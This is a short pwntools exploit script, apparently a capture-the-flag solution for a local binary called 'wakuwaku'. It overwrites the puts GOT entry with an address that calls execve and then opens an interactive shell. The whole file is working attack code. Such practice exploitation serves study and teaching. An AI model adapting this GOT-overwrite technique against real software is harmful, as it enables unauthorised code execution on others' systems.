from pwn import *


# Handle inject code
got_put_addr = p64(0x0000000000406018)  # Global Offset Table where store the global __GI__IO_puts() address

payload = b""
payload += b"\x01" * 32
payload += got_put_addr

execve_addr = p64(0x000000000040138e)  # Cover global __GI__IO_puts() address into the address which will call execve@plt()


# Start process
p = process("./wakuwaku")


# Stop there and attached with gdb
raw_input()  # In python standard library, used for wating input


# Start to inject
p.recvuntil(b"What's your name ?\nName: ")
p.sendline(payload)

p.recvuntil(b"Place your bets (minimum is $10000) : ")
p.sendline(execve_addr)

p.recvuntil(b"Guess your number (ans betwwen 0~999) : ")
p.sendline(b"99")  # Guess whatever you want

p.interactive()


